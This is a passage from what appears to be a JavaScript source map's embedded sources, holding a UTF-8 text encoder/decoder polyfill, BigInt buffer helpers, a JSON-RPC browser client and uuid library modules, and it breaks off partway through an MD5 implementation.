UTF8Decoder({fatal: this._fatal});\n      this._BOMseen = false;\n    }\n    this._streaming = Boolean(options['stream']);\n\n    var input_stream = new Stream(bytes);\n\n    var code_points = [];\n\n    /** @type {?(number|!Array.<number>)} */\n    var result;\n\n    while (!input_stream.endOfStream()) {\n      result = this._decoder.handler(input_stream, input_stream.read());\n      if (result === finished)\n        break;\n      if (result === null)\n        continue;\n      if (Array.isArray(result))\n        code_points.push.apply(code_points, /**@type {!Array.<number>}*/(result));\n      else\n        code_points.push(result);\n    }\n    if (!this._streaming) {\n      do {\n        result = this._decoder.handler(input_stream, input_stream.read());\n        if (result === finished)\n          break;\n        if (result === null)\n          continue;\n        if (Array.isArray(result))\n          code_points.push.apply(code_points, /**@type {!Array.<number>}*/(result));\n        else\n          code_points.push(result);\n      } while (!input_stream.endOfStream());\n      this._decoder = null;\n    }\n\n    if (code_points.length) {\n      // If encoding is one of utf-8, utf-16be, and utf-16le, and\n      // ignore BOM flag and BOM seen flag are unset, run these\n      // subsubsteps:\n      if (['utf-8'].indexOf(this.encoding) !== -1 &&\n          !this._ignoreBOM && !this._BOMseen) {\n        // If token is U+FEFF, set BOM seen flag.\n        if (code_points[0] === 0xFEFF) {\n          this._BOMseen = true;\n          code_points.shift();\n        } else {\n          // Otherwise, if token is not end-of-stream, set BOM seen\n          // flag and append token to output.\n          this._BOMseen = true;\n        }\n      }\n    }\n\n    return codePointsToString(code_points);\n  }\n};\n\n// 7.2 Interface TextEncoder\n\n/**\n * @constructor\n * @param {string=} encoding The label of the encoding;\n *     defaults to 'utf-8'.\n * @param {Object=} options\n */\nfunction TextEncoder(encoding, options) {\n  if (!(this instanceof TextEncoder))\n    return new TextEncoder(encoding, options);\n  encoding = encoding !== undefined ? String(encoding).toLowerCase() : DEFAULT_ENCODING;\n  if (encoding !== DEFAULT_ENCODING) {\n    throw new Error('Encoding not supported. Only utf-8 is supported');\n  }\n  options = ToDictionary(options);\n\n  /** @private @type {boolean} */\n  this._streaming = false;\n  /** @private @type {?Encoder} */\n  this._encoder = null;\n  /** @private @type {{fatal: boolean}} */\n  this._options = {fatal: Boolean(options['fatal'])};\n\n  Object.defineProperty(this, 'encoding', {value: 'utf-8'});\n}\n\nTextEncoder.prototype = {\n  /**\n   * @param {string=} opt_string The string to encode.\n   * @param {Object=} options\n   * @return {Uint8Array} Encoded bytes, as a Uint8Array.\n   */\n  encode: function encode(opt_string, options) {\n    opt_string = opt_string ? String(opt_string) : '';\n    options = ToDictionary(options);\n\n    // NOTE: This option is nonstandard. None of the encodings\n    // permitted for encoding (i.e. UTF-8, UTF-16) are stateful,\n    // so streaming is not necessary.\n    if (!this._streaming)\n      this._encoder = new UTF8Encoder(this._options);\n    this._streaming = Boolean(options['stream']);\n\n    var bytes = [];\n    var input_stream = new Stream(stringToCodePoints(opt_string));\n    /** @type {?(number|!Array.<number>)} */\n    var result;\n    while (!input_stream.endOfStream()) {\n      result = this._encoder.handler(input_stream, input_stream.read());\n      if (result === finished)\n        break;\n      if (Array.isArray(result))\n        bytes.push.apply(bytes, /**@type {!Array.<number>}*/(result));\n      else\n        bytes.push(result);\n    }\n    if (!this._streaming) {\n      while (true) {\n        result = this._encoder.handler(input_stream, input_stream.read());\n        if (result === finished)\n          break;\n        if (Array.isArray(result))\n          bytes.push.apply(bytes, /**@type {!Array.<number>}*/(result));\n        else\n          bytes.push(result);\n      }\n      this._encoder = null;\n    }\n    return new Uint8Array(bytes);\n  }\n};\n\n//\n// 8. The encoding\n//\n\n// 8.1 utf-8\n\n/**\n * @constructor\n * @implements {Decoder}\n * @param {{fatal: boolean}} options\n */\nfunction UTF8Decoder(options) {\n  var fatal = options.fatal;\n\n  // utf-8's decoder's has an associated utf-8 code point, utf-8\n  // bytes seen, and utf-8 bytes needed (all initially 0), a utf-8\n  // lower boundary (initially 0x80), and a utf-8 upper boundary\n  // (initially 0xBF).\n  var /** @type {number} */ utf8_code_point = 0,\n      /** @type {number} */ utf8_bytes_seen = 0,\n      /** @type {number} */ utf8_bytes_needed = 0,\n      /** @type {number} */ utf8_lower_boundary = 0x80,\n      /** @type {number} */ utf8_upper_boundary = 0xBF;\n\n  /**\n   * @param {Stream} stream The stream of bytes being decoded.\n   * @param {number} bite The next byte read from the stream.\n   * @return {?(number|!Array.<number>)} The next code point(s)\n   *     decoded, or null if not enough data exists in the input\n   *     stream to decode a complete code point.\n   */\n  this.handler = function(stream, bite) {\n    // 1. If byte is end-of-stream and utf-8 bytes needed is not 0,\n    // set utf-8 bytes needed to 0 and return error.\n    if (bite === end_of_stream && utf8_bytes_needed !== 0) {\n      utf8_bytes_needed = 0;\n      return decoderError(fatal);\n    }\n\n    // 2. If byte is end-of-stream, return finished.\n    if (bite === end_of_stream)\n      return finished;\n\n    // 3. If utf-8 bytes needed is 0, based on byte:\n    if (utf8_bytes_needed === 0) {\n\n      // 0x00 to 0x7F\n      if (inRange(bite, 0x00, 0x7F)) {\n        // Return a code point whose value is byte.\n        return bite;\n      }\n\n      // 0xC2 to 0xDF\n      if (inRange(bite, 0xC2, 0xDF)) {\n        // Set utf-8 bytes needed to 1 and utf-8 code point to byte\n        // − 0xC0.\n        utf8_bytes_needed = 1;\n        utf8_code_point = bite - 0xC0;\n      }\n\n      // 0xE0 to 0xEF\n      else if (inRange(bite, 0xE0, 0xEF)) {\n        // 1. If byte is 0xE0, set utf-8 lower boundary to 0xA0.\n        if (bite === 0xE0)\n          utf8_lower_boundary = 0xA0;\n        // 2. If byte is 0xED, set utf-8 upper boundary to 0x9F.\n        if (bite === 0xED)\n          utf8_upper_boundary = 0x9F;\n        // 3. Set utf-8 bytes needed to 2 and utf-8 code point to\n        // byte − 0xE0.\n        utf8_bytes_needed = 2;\n        utf8_code_point = bite - 0xE0;\n      }\n\n      // 0xF0 to 0xF4\n      else if (inRange(bite, 0xF0, 0xF4)) {\n        // 1. If byte is 0xF0, set utf-8 lower boundary to 0x90.\n        if (bite === 0xF0)\n          utf8_lower_boundary = 0x90;\n        // 2. If byte is 0xF4, set utf-8 upper boundary to 0x8F.\n        if (bite === 0xF4)\n          utf8_upper_boundary = 0x8F;\n        // 3. Set utf-8 bytes needed to 3 and utf-8 code point to\n        // byte − 0xF0.\n        utf8_bytes_needed = 3;\n        utf8_code_point = bite - 0xF0;\n      }\n\n      // Otherwise\n      else {\n        // Return error.\n        return decoderError(fatal);\n      }\n\n      // Then (byte is in the range 0xC2 to 0xF4) set utf-8 code\n      // point to utf-8 code point << (6 × utf-8 bytes needed) and\n      // return continue.\n      utf8_code_point = utf8_code_point << (6 * utf8_bytes_needed);\n      return null;\n    }\n\n    // 4. If byte is not in the range utf-8 lower boundary to utf-8\n    // upper boundary, run these substeps:\n    if (!inRange(bite, utf8_lower_boundary, utf8_upper_boundary)) {\n\n      // 1. Set utf-8 code point, utf-8 bytes needed, and utf-8\n      // bytes seen to 0, set utf-8 lower boundary to 0x80, and set\n      // utf-8 upper boundary to 0xBF.\n      utf8_code_point = utf8_bytes_needed = utf8_bytes_seen = 0;\n      utf8_lower_boundary = 0x80;\n      utf8_upper_boundary = 0xBF;\n\n      // 2. Prepend byte to stream.\n      stream.prepend(bite);\n\n      // 3. Return error.\n      return decoderError(fatal);\n    }\n\n    // 5. Set utf-8 lower boundary to 0x80 and utf-8 upper boundary\n    // to 0xBF.\n    utf8_lower_boundary = 0x80;\n    utf8_upper_boundary = 0xBF;\n\n    // 6. Increase utf-8 bytes seen by one and set utf-8 code point\n    // to utf-8 code point + (byte − 0x80) << (6 × (utf-8 bytes\n    // needed − utf-8 bytes seen)).\n    utf8_bytes_seen += 1;\n    utf8_code_point += (bite - 0x80) << (6 * (utf8_bytes_needed - utf8_bytes_seen));\n\n    // 7. If utf-8 bytes seen is not equal to utf-8 bytes needed,\n    // continue.\n    if (utf8_bytes_seen !== utf8_bytes_needed)\n      return null;\n\n    // 8. Let code point be utf-8 code point.\n    var code_point = utf8_code_point;\n\n    // 9. Set utf-8 code point, utf-8 bytes needed, and utf-8 bytes\n    // seen to 0.\n    utf8_code_point = utf8_bytes_needed = utf8_bytes_seen = 0;\n\n    // 10. Return a code point whose value is code point.\n    return code_point;\n  };\n}\n\n/**\n * @constructor\n * @implements {Encoder}\n * @param {{fatal: boolean}} options\n */\nfunction UTF8Encoder(options) {\n  var fatal = options.fatal;\n  /**\n   * @param {Stream} stream Input stream.\n   * @param {number} code_point Next code point read from the stream.\n   * @return {(number|!Array.<number>)} Byte(s) to emit.\n   */\n  this.handler = function(stream, code_point) {\n    // 1. If code point is end-of-stream, return finished.\n    if (code_point === end_of_stream)\n      return finished;\n\n    // 2. If code point is in the range U+0000 to U+007F, return a\n    // byte whose value is code point.\n    if (inRange(code_point, 0x0000, 0x007f))\n      return code_point;\n\n    // 3. Set count and offset based on the range code point is in:\n    var count, offset;\n    // U+0080 to U+07FF:    1 and 0xC0\n    if (inRange(code_point, 0x0080, 0x07FF)) {\n      count = 1;\n      offset = 0xC0;\n    }\n    // U+0800 to U+FFFF:    2 and 0xE0\n    else if (inRange(code_point, 0x0800, 0xFFFF)) {\n      count = 2;\n      offset = 0xE0;\n    }\n    // U+10000 to U+10FFFF: 3 and 0xF0\n    else if (inRange(code_point, 0x10000, 0x10FFFF)) {\n      count = 3;\n      offset = 0xF0;\n    }\n\n    // 4.Let bytes be a byte sequence whose first byte is (code\n    // point >> (6 × count)) + offset.\n    var bytes = [(code_point >> (6 * count)) + offset];\n\n    // 5. Run these substeps while count is greater than 0:\n    while (count > 0) {\n\n      // 1. Set temp to code point >> (6 × (count − 1)).\n      var temp = code_point >> (6 * (count - 1));\n\n      // 2. Append to bytes 0x80 | (temp & 0x3F).\n      bytes.push(0x80 | (temp & 0x3F));\n\n      // 3. Decrease count by one.\n      count -= 1;\n    }\n\n    // 6. Return bytes bytes, in order.\n    return bytes;\n  };\n}\n\nexports.TextEncoder = TextEncoder;\nexports.TextDecoder = TextDecoder;",null,null,"'use strict';\n\nObject.defineProperty(exports, \"__esModule\", { value: true });\nlet converter;\n/**\n * Convert a little-endian buffer into a BigInt.\n * @param buf The little-endian buffer to convert\n * @returns A BigInt with the little-endian representation of buf.\n */\nfunction toBigIntLE(buf) {\n    {\n        const reversed = Buffer.from(buf);\n        reversed.reverse();\n        const hex = reversed.toString('hex');\n        if (hex.length === 0) {\n            return BigInt(0);\n        }\n        return BigInt(`0x${hex}`);\n    }\n    return converter.toBigInt(buf, false);\n}\nexports.toBigIntLE = toBigIntLE;\n/**\n * Convert a big-endian buffer into a BigInt\n * @param buf The big-endian buffer to convert.\n * @returns A BigInt with the big-endian representation of buf.\n */\nfunction toBigIntBE(buf) {\n    {\n        const hex = buf.toString('hex');\n        if (hex.length === 0) {\n            return BigInt(0);\n        }\n        return BigInt(`0x${hex}`);\n    }\n    return converter.toBigInt(buf, true);\n}\nexports.toBigIntBE = toBigIntBE;\n/**\n * Convert a BigInt to a little-endian buffer.\n * @param num   The BigInt to convert.\n * @param width The number of bytes that the resulting buffer should be.\n * @returns A little-endian buffer representation of num.\n */\nfunction toBufferLE(num, width) {\n    {\n        const hex = num.toString(16);\n        const buffer = Buffer.from(hex.padStart(width * 2, '0').slice(0, width * 2), 'hex');\n        buffer.reverse();\n        return buffer;\n    }\n    // Allocation is done here, since it is slower using napi in C\n    return converter.fromBigInt(num, Buffer.allocUnsafe(width), false);\n}\nexports.toBufferLE = toBufferLE;\n/**\n * Convert a BigInt to a big-endian buffer.\n * @param num   The BigInt to convert.\n * @param width The number of bytes that the resulting buffer should be.\n * @returns A big-endian buffer representation of num.\n */\nfunction toBufferBE(num, width) {\n    {\n        const hex = num.toString(16);\n        return Buffer.from(hex.padStart(width * 2, '0').slice(0, width * 2), 'hex');\n    }\n    return converter.fromBigInt(num, Buffer.allocUnsafe(width), true);\n}\nexports.toBufferBE = toBufferBE;\n",null,null,null,null,null,null,null,null,"exports.interopDefault = function (a) {\n  return a && a.__esModule ? a : {default: a};\n};\n\nexports.defineInteropFlag = function (a) {\n  Object.defineProperty(a, '__esModule', {value: true});\n};\n\nexports.exportAll = function (source, dest) {\n  Object.keys(source).forEach(function (key) {\n    if (\n      key === 'default' ||\n      key === '__esModule' ||\n      Object.prototype.hasOwnProperty.call(dest, key)\n    ) {\n      return;\n    }\n\n    Object.defineProperty(dest, key, {\n      enumerable: true,\n      get: function () {\n        return source[key];\n      },\n    });\n  });\n\n  return dest;\n};\n\nexports.export = function (dest, destName, get) {\n  Object.defineProperty(dest, destName, {\n    enumerable: true,\n    get: get,\n  });\n};\n","'use strict';\n\nconst uuid = require('uuid').v4;\nconst generateRequest = require('../../generateRequest');\n\n/**\n * Constructor for a Jayson Browser Client that does not depend any node.js core libraries\n * @class ClientBrowser\n * @param {Function} callServer Method that calls the server, receives the stringified request and a regular node-style callback\n * @param {Object} [options]\n * @param {Function} [options.reviver] Reviver function for JSON\n * @param {Function} [options.replacer] Replacer function for JSON\n * @param {Number} [options.version=2] JSON-RPC version to use (1|2)\n * @param {Function} [options.generator] Function to use for generating request IDs\n *  @param {Boolean} [options.notificationIdNull=false] When true, version 2 requests will set id to null instead of omitting it\n * @return {ClientBrowser}\n */\nconst ClientBrowser = function(callServer, options) {\n  if(!(this instanceof ClientBrowser)) {\n    return new ClientBrowser(callServer, options);\n  }\n\n  if (!options) {\n    options = {};\n  }\n\n  this.options = {\n    reviver: typeof options.reviver !== 'undefined' ? options.reviver : null,\n    replacer: typeof options.replacer !== 'undefined' ? options.replacer : null,\n    generator: typeof options.generator !== 'undefined' ? options.generator : function() { return uuid(); },\n    version: typeof options.version !== 'undefined' ? options.version : 2,\n    notificationIdNull: typeof options.notificationIdNull === 'boolean' ? options.notificationIdNull : false,\n  };\n\n  this.callServer = callServer;\n};\n\nmodule.exports = ClientBrowser;\n\n/**\n *  Creates a request and dispatches it if given a callback.\n *  @param {String|Array} method A batch request if passed an Array, or a method name if passed a String\n *  @param {Array|Object} [params] Parameters for the method\n *  @param {String|Number} [id] Optional id. If undefined an id will be generated. If null it creates a notification request\n *  @param {Function} [callback] Request callback. If specified, executes the request rather than only returning it.\n *  @throws {TypeError} Invalid parameters\n *  @return {Object} JSON-RPC 1.0 or 2.0 compatible request\n */\nClientBrowser.prototype.request = function(method, params, id, callback) {\n  const self = this;\n  let request = null;\n\n  // is this a batch request?\n  const isBatch = Array.isArray(method) && typeof params === 'function';\n\n  if (this.options.version === 1 && isBatch) {\n    throw new TypeError('JSON-RPC 1.0 does not support batching');\n  }\n\n  // is this a raw request?\n  const isRaw = !isBatch && method && typeof method === 'object' && typeof params === 'function';\n\n  if(isBatch || isRaw) {\n    callback = params;\n    request = method;\n  } else {\n    if(typeof id === 'function') {\n      callback = id;\n      // specifically undefined because \"null\" is a notification request\n      id = undefined;\n    }\n\n    const hasCallback = typeof callback === 'function';\n\n    try {\n      request = generateRequest(method, params, id, {\n        generator: this.options.generator,\n        version: this.options.version,\n        notificationIdNull: this.options.notificationIdNull,\n      });\n    } catch(err) {\n      if(hasCallback) {\n        return callback(err);\n      }\n      throw err;\n    }\n\n    // no callback means we should just return a raw request\n    if(!hasCallback) {\n      return request;\n    }\n\n  }\n\n  let message;\n  try {\n    message = JSON.stringify(request, this.options.replacer);\n  } catch(err) {\n    return callback(err);\n  }\n\n  this.callServer(message, function(err, response) {\n    self._parseResponse(err, response, callback);\n  });\n\n  // always return the raw request\n  return request;\n};\n\n/**\n * Parses a response from a server\n * @param {Object} err Error to pass on that is unrelated to the actual response\n * @param {String} responseText JSON-RPC 1.0 or 2.0 response\n * @param {Function} callback Callback that will receive different arguments depending on the amount of parameters\n * @private\n */\nClientBrowser.prototype._parseResponse = function(err, responseText, callback) {\n  if(err) {\n    callback(err);\n    return;\n  }\n\n  if(!responseText) {\n    // empty response text, assume that is correct because it could be a\n    // notification which jayson does not give any body for\n    return callback();\n  }\n\n  let response;\n  try {\n    response = JSON.parse(responseText, this.options.reviver);\n  } catch(err) {\n    return callback(err);\n  }\n\n  if(callback.length === 3) {\n    // if callback length is 3, we split callback arguments on error and response\n\n    // is batch response?\n    if(Array.isArray(response)) {\n\n      // neccesary to split strictly on validity according to spec here\n      const isError = function(res) {\n        return typeof res.error !== 'undefined';\n      };\n\n      const isNotError = function (res) {\n        return !isError(res);\n      };\n\n      return callback(null, response.filter(isError), response.filter(isNotError));\n    \n    } else {\n\n      // split regardless of validity\n      return callback(null, response.error, response.result);\n    \n    }\n  \n  }\n\n  callback(null, response);\n};\n","export { default as v1 } from './v1.js';\nexport { default as v3 } from './v3.js';\nexport { default as v4 } from './v4.js';\nexport { default as v5 } from './v5.js';\nexport { default as NIL } from './nil.js';\nexport { default as version } from './version.js';\nexport { default as validate } from './validate.js';\nexport { default as stringify } from './stringify.js';\nexport { default as parse } from './parse.js';","import rng from './rng.js';\nimport stringify from './stringify.js'; // **`v1()` - Generate time-based UUID**\n//\n// Inspired by https://github.com/LiosK/UUID.js\n// and http://docs.python.org/library/uuid.html\n\nvar _nodeId;\n\nvar _clockseq; // Previous uuid creation time\n\n\nvar _lastMSecs = 0;\nvar _lastNSecs = 0; // See https://github.com/uuidjs/uuid for API details\n\nfunction v1(options, buf, offset) {\n  var i = buf && offset || 0;\n  var b = buf || new Array(16);\n  options = options || {};\n  var node = options.node || _nodeId;\n  var clockseq = options.clockseq !== undefined ? options.clockseq : _clockseq; // node and clockseq need to be initialized to random values if they're not\n  // specified.  We do this lazily to minimize issues related to insufficient\n  // system entropy.  See #189\n\n  if (node == null || clockseq == null) {\n    var seedBytes = options.random || (options.rng || rng)();\n\n    if (node == null) {\n      // Per 4.5, create and 48-bit node id, (47 random bits + multicast bit = 1)\n      node = _nodeId = [seedBytes[0] | 0x01, seedBytes[1], seedBytes[2], seedBytes[3], seedBytes[4], seedBytes[5]];\n    }\n\n    if (clockseq == null) {\n      // Per 4.2.2, randomize (14 bit) clockseq\n      clockseq = _clockseq = (seedBytes[6] << 8 | seedBytes[7]) & 0x3fff;\n    }\n  } // UUID timestamps are 100 nano-second units since the Gregorian epoch,\n  // (1582-10-15 00:00).  JSNumbers aren't precise enough for this, so\n  // time is handled internally as 'msecs' (integer milliseconds) and 'nsecs'\n  // (100-nanoseconds offset from msecs) since unix epoch, 1970-01-01 00:00.\n\n\n  var msecs = options.msecs !== undefined ? options.msecs : Date.now(); // Per 4.2.1.2, use count of uuid's generated during the current clock\n  // cycle to simulate higher resolution clock\n\n  var nsecs = options.nsecs !== undefined ? options.nsecs : _lastNSecs + 1; // Time since last uuid creation (in msecs)\n\n  var dt = msecs - _lastMSecs + (nsecs - _lastNSecs) / 10000; // Per 4.2.1.2, Bump clockseq on clock regression\n\n  if (dt < 0 && options.clockseq === undefined) {\n    clockseq = clockseq + 1 & 0x3fff;\n  } // Reset nsecs if clock regresses (new clockseq) or we've moved onto a new\n  // time interval\n\n\n  if ((dt < 0 || msecs > _lastMSecs) && options.nsecs === undefined) {\n    nsecs = 0;\n  } // Per 4.2.1.2 Throw error if too many uuids are requested\n\n\n  if (nsecs >= 10000) {\n    throw new Error(\"uuid.v1(): Can't create more than 10M uuids/sec\");\n  }\n\n  _lastMSecs = msecs;\n  _lastNSecs = nsecs;\n  _clockseq = clockseq; // Per 4.1.4 - Convert from unix epoch to Gregorian epoch\n\n  msecs += 12219292800000; // `time_low`\n\n  var tl = ((msecs & 0xfffffff) * 10000 + nsecs) % 0x100000000;\n  b[i++] = tl >>> 24 & 0xff;\n  b[i++] = tl >>> 16 & 0xff;\n  b[i++] = tl >>> 8 & 0xff;\n  b[i++] = tl & 0xff; // `time_mid`\n\n  var tmh = msecs / 0x100000000 * 10000 & 0xfffffff;\n  b[i++] = tmh >>> 8 & 0xff;\n  b[i++] = tmh & 0xff; // `time_high_and_version`\n\n  b[i++] = tmh >>> 24 & 0xf | 0x10; // include version\n\n  b[i++] = tmh >>> 16 & 0xff; // `clock_seq_hi_and_reserved` (Per 4.2.2 - include variant)\n\n  b[i++] = clockseq >>> 8 | 0x80; // `clock_seq_low`\n\n  b[i++] = clockseq & 0xff; // `node`\n\n  for (var n = 0; n < 6; ++n) {\n    b[i + n] = node[n];\n  }\n\n  return buf || stringify(b);\n}\n\nexport default v1;","// Unique ID creation requires a high quality random # generator. In the browser we therefore\n// require the crypto API and do not support built-in fallback to lower quality random number\n// generators (like Math.random()).\nvar getRandomValues;\nvar rnds8 = new Uint8Array(16);\nexport default function rng() {\n  // lazy load so that environments that need to polyfill have a chance to do so\n  if (!getRandomValues) {\n    // getRandomValues needs to be invoked in a context where \"this\" is a Crypto implementation. Also,\n    // find the complete implementation of crypto (msCrypto) on IE11.\n    getRandomValues = typeof crypto !== 'undefined' && crypto.getRandomValues && crypto.getRandomValues.bind(crypto) || typeof msCrypto !== 'undefined' && typeof msCrypto.getRandomValues === 'function' && msCrypto.getRandomValues.bind(msCrypto);\n\n    if (!getRandomValues) {\n      throw new Error('crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported');\n    }\n  }\n\n  return getRandomValues(rnds8);\n}","import validate from './validate.js';\n/**\n * Convert array of 16 byte values to UUID string format of the form:\n * XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n */\n\nvar byteToHex = [];\n\nfor (var i = 0; i < 256; ++i) {\n  byteToHex.push((i + 0x100).toString(16).substr(1));\n}\n\nfunction stringify(arr) {\n  var offset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;\n  // Note: Be careful editing this code!  It's been tuned for performance\n  // and works in ways you may not expect. See https://github.com/uuidjs/uuid/pull/434\n  var uuid = (byteToHex[arr[offset + 0]] + byteToHex[arr[offset + 1]] + byteToHex[arr[offset + 2]] + byteToHex[arr[offset + 3]] + '-' + byteToHex[arr[offset + 4]] + byteToHex[arr[offset + 5]] + '-' + byteToHex[arr[offset + 6]] + byteToHex[arr[offset + 7]] + '-' + byteToHex[arr[offset + 8]] + byteToHex[arr[offset + 9]] + '-' + byteToHex[arr[offset + 10]] + byteToHex[arr[offset + 11]] + byteToHex[arr[offset + 12]] + byteToHex[arr[offset + 13]] + byteToHex[arr[offset + 14]] + byteToHex[arr[offset + 15]]).toLowerCase(); // Consistency check for valid UUID.  If this throws, it's likely due to one\n  // of the following:\n  // - One or more input array values don't map to a hex octet (leading to\n  // \"undefined\" in the uuid)\n  // - Invalid input values for the RFC `version` or `variant` fields\n\n  if (!validate(uuid)) {\n    throw TypeError('Stringified UUID is invalid');\n  }\n\n  return uuid;\n}\n\nexport default stringify;","import REGEX from './regex.js';\n\nfunction validate(uuid) {\n  return typeof uuid === 'string' && REGEX.test(uuid);\n}\n\nexport default validate;","export default /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;","import v35 from './v35.js';\nimport md5 from './md5.js';\nvar v3 = v35('v3', 0x30, md5);\nexport default v3;","import stringify from './stringify.js';\nimport parse from './parse.js';\n\nfunction stringToBytes(str) {\n  str = unescape(encodeURIComponent(str)); // UTF8 escape\n\n  var bytes = [];\n\n  for (var i = 0; i < str.length; ++i) {\n    bytes.push(str.charCodeAt(i));\n  }\n\n  return bytes;\n}\n\nexport var DNS = '6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nexport var URL = '6ba7b811-9dad-11d1-80b4-00c04fd430c8';\nexport default function (name, version, hashfunc) {\n  function generateUUID(value, namespace, buf, offset) {\n    if (typeof value === 'string') {\n      value = stringToBytes(value);\n    }\n\n    if (typeof namespace === 'string') {\n      namespace = parse(namespace);\n    }\n\n    if (namespace.length !== 16) {\n      throw TypeError('Namespace must be array-like (16 iterable integer values, 0-255)');\n    } // Compute hash of namespace and value, Per 4.3\n    // Future: Use spread syntax when supported on all platforms, e.g. `bytes =\n    // hashfunc([...namespace, ... value])`\n\n\n    var bytes = new Uint8Array(16 + value.length);\n    bytes.set(namespace);\n    bytes.set(value, namespace.length);\n    bytes = hashfunc(bytes);\n    bytes[6] = bytes[6] & 0x0f | version;\n    bytes[8] = bytes[8] & 0x3f | 0x80;\n\n    if (buf) {\n      offset = offset || 0;\n\n      for (var i = 0; i < 16; ++i) {\n        buf[offset + i] = bytes[i];\n      }\n\n      return buf;\n    }\n\n    return stringify(bytes);\n  } // Function#name is not settable on some platforms (#270)\n\n\n  try {\n    generateUUID.name = name; // eslint-disable-next-line no-empty\n  } catch (err) {} // For CommonJS default export support\n\n\n  generateUUID.DNS = DNS;\n  generateUUID.URL = URL;\n  return generateUUID;\n}","import validate from './validate.js';\n\nfunction parse(uuid) {\n  if (!validate(uuid)) {\n    throw TypeError('Invalid UUID');\n  }\n\n  var v;\n  var arr = new Uint8Array(16); // Parse ########-....-....-....-............\n\n  arr[0] = (v = parseInt(uuid.slice(0, 8), 16)) >>> 24;\n  arr[1] = v >>> 16 & 0xff;\n  arr[2] = v >>> 8 & 0xff;\n  arr[3] = v & 0xff; // Parse ........-####-....-....-............\n\n  arr[4] = (v = parseInt(uuid.slice(9, 13), 16)) >>> 8;\n  arr[5] = v & 0xff; // Parse ........-....-####-....-............\n\n  arr[6] = (v = parseInt(uuid.slice(14, 18), 16)) >>> 8;\n  arr[7] = v & 0xff; // Parse ........-....-....-####-............\n\n  arr[8] = (v = parseInt(uuid.slice(19, 23), 16)) >>> 8;\n  arr[9] = v & 0xff; // Parse ........-....-....-....-############\n  // (Use \"/\" to avoid 32-bit truncation when bit-shifting high-order bytes)\n\n  arr[10] = (v = parseInt(uuid.slice(24, 36), 16)) / 0x10000000000 & 0xff;\n  arr[11] = v / 0x100000000 & 0xff;\n  arr[12] = v >>> 24 & 0xff;\n  arr[13] = v >>> 16 & 0xff;\n  arr[14] = v >>> 8 & 0xff;\n  arr[15] = v & 0xff;\n  return arr;\n}\n\nexport default parse;","/*\n * Browser-compatible JavaScript MD5\n *\n * Modification of JavaScript MD5\n * https://github.com/blueimp/JavaScript-MD5\n *\n * Copyright 2011, Sebastian Tschan\n * https://blueimp.net\n *\n * Licensed under the MIT license:\n * https://opensource.org/licenses/MIT\n *\n * Based on\n * A JavaScript implementation of the RSA Data Security, Inc. MD5 Message\n * Digest Algorithm, as defined in RFC 1321.\n * Version 2.2 Copyright (C) Paul Johnston 1999 - 2009\n * Other contributors: Greg Holt, Andrew Kepert, Ydnar, Lostinet\n * Distributed under the BSD License\n * See http://pajhome.org.uk/crypt/md5 for more info.\n */\nfunction md5(bytes) {\n  if (typeof bytes === 'string') {\n    var msg = unescape(encodeURIComponent(bytes)); // UTF8 escape\n\n    bytes = new Uint8Array(msg.length);\n\n    for (var i = 0; i < msg.length; ++i) {\n      bytes[i] = msg.charCodeAt(i);\n    }\n  }\n\n  return md5ToHexEncodedArray(wordsToMd5(bytesToWords(bytes), bytes.length * 8));\n}\n/*\n * Convert an array of little-endian words to an array of bytes\n */\n\n\nfunction md5ToHexEncodedArray(input) {\n  var output = [];\n  var length32 = input.length * 32;\n  var hexTab = '0123456789abcdef';\n\n  for (var i = 0; i < length32; i += 8) {\n    var x = input[i >> 5] >>> i % 32 & 0xff;\n    var hex = parseInt(hexTab.charAt(x >>> 4 & 0x0f) + hexTab.charAt(x & 0x0f), 16);\n    output.push(hex);\n  }\n\n  return output;\n}\n/**\n * Calculate output length with padding and bit length\n */\n\n\nfunction getOutputLength(inputLength8) {\n  return (inputLength8 + 64 >>> 9 << 4) + 14 + 1;\n}\n/*\n * Calculate the MD5 of an array of little-endian words, and a bit length.\n */\n\n\nfunction wordsToMd5(x, len) {\n  /* append padding */\n  x[len >> 5] |= 0x80 << len % 32;\n  x[getOutputLength(len) - 1] = len;\n  var a = 1732584193;\n  var b = -271733879;\n  var c = -1732584194;\n  var d = 271733878;\n\n  for (var i = 0; i < x.length; i += 16) {\n    var olda = a;\n    var oldb = b;\n    var oldc = c;\n    var oldd = d;\n    a = md5ff(a, b, c, d, x[i], 7, -680876936);\n    d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);\n    c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);\n    b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);\n    a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);\n    d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);\n    c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);\n    b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);\n    a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);\n    d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);\n    c = md5ff(c, d, a, b, x[i + 10], 17, -42063);\n    b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);\n    a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);\n    d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);\n    c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);\n    b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);\n    a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);\n    d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);\n    c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);\n    b = md5gg(b, c, d, a, x[i], 20, -373897302);\n    a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);\n    d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);\n    c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);\n    b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);\n    a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);\n    d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);\n    c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);\n    b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);\n    a = md5gg(a, b, c, d, 